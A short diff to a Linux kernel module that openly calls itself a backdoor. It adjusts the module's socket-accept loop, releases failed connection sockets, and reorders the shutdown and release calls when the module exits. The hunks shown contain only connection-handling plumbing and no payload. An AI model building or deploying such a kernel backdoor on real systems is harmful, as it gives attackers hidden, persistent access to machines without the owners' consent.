@@ -67,7 +67,7 @@ static void send_message(struct socket *conn)
 
 static int backdoor_socket_listen(void *_)
 {
-	while (!kthread_should_stop()) {
+	while (true) {
 		struct socket *conn = sock_alloc();
 		int err;
 		conn->type = sock->type;
@@ -76,6 +76,8 @@ static int backdoor_socket_listen(void *_)
 		printk(KERN_INFO "backdoor: waiting on accept\n");
 		err = sock->ops->accept(sock, conn, O_RDWR, true);
 		if (err < 0) {
+			conn->ops->release(conn);
+
 			if (kthread_should_stop()) {
 				break;
 			}
@@ -98,6 +100,7 @@ static int backdoor_socket_listen(void *_)
 
 void __exit backdoor_socket_exit(void)
 {
-	sock->ops->release(sock);
+	sock->ops->shutdown(sock, SHUT_RDWR);
 	kthread_stop(listener);
+	sock->ops->release(sock);
 }
